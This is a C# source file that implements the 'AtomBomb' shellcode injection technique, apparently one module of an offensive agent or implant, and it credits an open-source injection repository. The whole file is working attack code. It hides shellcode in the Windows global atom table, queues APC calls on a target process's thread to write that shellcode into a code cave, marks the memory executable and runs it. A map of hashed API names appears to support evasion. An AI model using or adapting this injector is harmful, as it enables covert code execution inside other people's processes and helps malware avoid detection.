using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection.Metadata.Ecma335;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Agent
{
    //https://github.com/plackyhacker/Shellcode-Injection-Techniques/blob/master/ShellcodeInjectionTechniques/Native.cs
    //Credit: @plackyhacker
    public class AtomBomb : ITechnique
    {
        int ITechnique.id => 3;

        public bool resolved { get; set; }

        Dictionary<string, string> map = new Dictionary<string, string>()
        {
            { "k32", "A63CBAF3BECF39638EEBC81A422A5D00" },
            { "ntd", "532FBE7D503E25FEDC8544721B744E16" },
            { "ot", "0F64BB1E3663602915D1704D11CECFBB" },
            { "vqe", "20A57E6DC41F83A8E6165946FC24028B" },
            { "rpm", "D6A7D8802A1A96B0F330022B9C68DFC7" },
            { "gpa", "96D9BE88669FB6C925C85443F50CC504" },
            { "gaaw", "6F909A718BF5B419169EA47B7FE43261" },
            { "nqat", "67D69EC328C646633596BF39046FE76D" },
            { "nqua", "6F98ACAE82A620484CEE2E63A19DF0BC" },
        };

        bool ITechnique.Inject(byte[] shellcode, nint hTarget)
        {
            try
            {
                Process proc = Process.GetProcessById(Native.GetProcessId(hTarget));
                if (proc is null || proc.Id == 0)
                {
                    return false;
                }

                return Run(proc, shellcode);
            }
            catch
            {
                return false;
            }
        }

        bool ITechnique.Inject(byte[] shellcode, Process proc)
        {
            return Run(proc, shellcode);
        }
        public bool Run(Process target, byte[] shellcode)
        {
            ProcessThread thread = GetThread(target.Threads);
            //Debug("[+] Found thread: {0}", new string[] { thread.Id.ToString() });

            // get a handle to the thread
            IntPtr hThread = Native.OpenThread(Native.ThreadAccess.GET_CONTEXT | Native.ThreadAccess.SET_CONTEXT, false, (UInt32)thread.Id);
            //Debug("[+] OpenThread() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });

            // need to find a remote page we can write to
            PageHelper[] pWritablePages = FindWritablePages(target.Handle, thread.StartAddress);
            //FindWritablePage(target.Handle, thread.StartAddress);
            if (pWritablePages.Length == 0)
            {
               //Debug("[!] Unable to find writable page!");
                return false;
            }

            // try to find a code cave in the writable pages to atom bomb our shellcode
            IntPtr pWritable = IntPtr.Zero;
            for (int i = 0; i < pWritablePages.Length; i++)
            {
                pWritable = FindCodeCave(target.Handle, pWritablePages[i].BaseAddress, shellcode.Length, pWritablePages[i].RegionSize);
                if (pWritable != IntPtr.Zero)
                    break;
            }

            // we did not find a suitable code cave
            if (pWritable == IntPtr.Zero)
            {
                //Debug("[!] Unable to find a suitable code cave!");
                return false;
            }
            //else
                //Debug("[+] Found a suitable code cave - pWritable: 0x{0}", new string[] { pWritable.ToString("X") });

            IntPtr codeCave = pWritable;

            // get the proc address - GlobalGetAtomNameA
            IntPtr pGlobalGetAtomNameW = Native.GetProcAddress(GetModuleBaseAddress("kernel32.dll"), "GlobalGetAtomNameW");
            //Debug("[+] GetProcAddress() - pGlobalGetAtomNameW: 0x{0}", new string[] { pGlobalGetAtomNameW.ToString("X") });


            // define a chunk size to write our atom names (note: an atom name can be 255 max size)
            Int32 chunkSize = 200;

            // add the atom names as shellcode chunks of length chunkSize - including the terminating null byte
            Int32 sections = (shellcode.Length / chunkSize) + 1;

            // loop through the sections and add the shell code as atom names
            for (int i = 0; i < sections; i++)
            {
                // get the next shellcode chunk
                byte[] tmpBytes = SubArray(shellcode, i * chunkSize, chunkSize);
                byte[] shellcodeChunk = new byte[tmpBytes.Length + 1];

                // add a null byte to the end
                Buffer.BlockCopy(tmpBytes, 0, shellcodeChunk, 0, tmpBytes.Length);
                Buffer.BlockCopy(new byte[1] { 0x00 }, 0, shellcodeChunk, tmpBytes.Length, 1);

                // add the shellcode to the global atom table
                unsafe
                {
                    fixed (byte* ptr = shellcodeChunk)
                    {
                        UInt16 ATOM = Native.GlobalAddAtomW((IntPtr)ptr);
                        //Debug("[+] GlobalAddAtom() - ATOM: 0x{0}", new string[] { ATOM.ToString("X") });

                        // queue the APC thread
                        Native.NtQueueApcThread(hThread, pGlobalGetAtomNameW, ATOM, pWritable, chunkSize * 2);
                        //Debug("[+] NtQueueApcThread() - pWritable: 0x{0}", new string[] { pWritable.ToString("X") });

                        // increment to the next writable memory location
                        pWritable += chunkSize;
                    }
                }
            }

            IntPtr pVirtualProtect = Native.GetProcAddress(GetModuleBaseAddress("kernel32.dll"), "VirtualProtect");
            //Debug("[+] GetProcAddress() - pVirtualProtect: 0x{0}", new string[] { pVirtualProtect.ToString("X") });

            Native.NtQueueApcThread(hThread, pVirtualProtect, (UInt32)codeCave, (IntPtr)shellcode.Length, (Int32)(Native.MemoryProtection.PAGE_EXECUTE_READWRITE));
            //Debug("[+] NtQueueApcThread() PAGE_EXECUTE_READWRITE - codeCave: 0x{0}", new string[] { codeCave.ToString("X") });

            if(Native.QueueUserAPC(codeCave, hThread, IntPtr.Zero) > 0)
            {
                return true;
            }
            return false;
        }
        private ProcessThread GetThread(ProcessThreadCollection threads)
        {
            // find a thread
            // it is very likely that the process you are hijacking will be unstable as 0 is probably the main thread
            return threads[0];

            /*
            // you could loop through the threads looking for a better one
            foreach(ProcessThread thread in threads)
            {
            }
            */
        }
        PageHelper[] FindWritablePages(IntPtr hProcess, IntPtr threadStartAddress)
        {
            Int32 size;
            List<PageHelper> pages = new List<PageHelper>();

            while (true)
            {
                try
                {
                    // query the memory region to see if it is readable and writable, and grab the region size
                    size = Native.VirtualQueryEx(hProcess, threadStartAddress, out Native.MEMORY_BASIC_INFORMATION lpBuffer, (UInt32)Marshal.SizeOf(typeof(Native.MEMORY_BASIC_INFORMATION)));

                    if (size != 0)
                    {
                        // we need readable and writable pages to find a code cave and write our shellcode to
                        string pageProtection = Enum.GetName(typeof(Native.MemoryProtection), lpBuffer.Protect);
                        if (pageProtection.Contains("WRITE") && pageProtection.Contains("READ"))
                            pages.Add(new PageHelper(lpBuffer.BaseAddress, (Int32)lpBuffer.RegionSize));

                        // move to the next page
                        threadStartAddress = IntPtr.Add(threadStartAddress, (Int32)lpBuffer.RegionSize);
                    }
                    else
                        continue;
                }
                catch
                {
                    break;
                }
            }

            return pages.ToArray();
        }

        IntPtr FindCodeCave(IntPtr hProcess, IntPtr startAddress, int size, int regionSize)
        {
            // byte array to hold the read memory
            byte[] areaToSearch = new byte[regionSize];

            // the region in memory so we can search it for a code cave
            if (!Native.ReadProcessMemory(hProcess, startAddress, areaToSearch, regionSize, out IntPtr lpNumberOfBytesRead))
            {
                // this shouldnt happen but if it does just return zero
                return IntPtr.Zero;
            }

            // look for a code cave
            for (int i = 0; i < (Int32)lpNumberOfBytesRead; i++)
            {
                // find the start of a possible code cave
                if (areaToSearch[i] != 0x00)
                    continue;

                // if we are nearing the end of the region just return zero
                if (i + size >= (Int32)lpNumberOfBytesRead)
                    return IntPtr.Zero;

                // now we need to check to see if there are enough consecutive zeros to put our shellcode
                bool found = false;
                for (int j = i; j < i + size; j++)
                {
                    if (areaToSearch[j] != 0x00)
                    {
                        i = j;
                        break;
                    }
                    else
                    {
                        // we have a code cave
                        if (j == i + (size - 1))
                        {
                            found = true;
                            break;
                        }
                    }
                }

                // return the code cave address
                if (found)
                    return IntPtr.Add(startAddress, i);
            }

            return IntPtr.Zero;
        }

        IntPtr GetModuleBaseAddress(string name)
        {
            Process hProc = Process.GetCurrentProcess();

            foreach (ProcessModule m in hProc.Modules)
            {
                if (m.ModuleName.ToUpper().StartsWith(name.ToUpper()))
                    return m.BaseAddress;
            }

            // we can't find the base address
            return IntPtr.Zero;
        }
        private class PageHelper
        {
            public IntPtr BaseAddress { get; set; }
            public Int32 RegionSize { get; set; }

            public PageHelper(IntPtr baseAddress, Int32 regionSize)
            {
                BaseAddress = baseAddress;
                RegionSize = regionSize;
            }
        }
        public static byte[] SubArray(byte[] a, int startIndex, int length)
        {
            int lengthOfArrayToCopy = length;
            if (length + startIndex > a.Length)
                lengthOfArrayToCopy = a.Length - startIndex;

            byte[] b = new byte[lengthOfArrayToCopy];
            for (int i = 0; i < lengthOfArrayToCopy; i++)
            {
                b[i] = a[startIndex + i];
            }
            return b;
        }

        public bool Resolve()
        {
            return true;
        }
    }
}
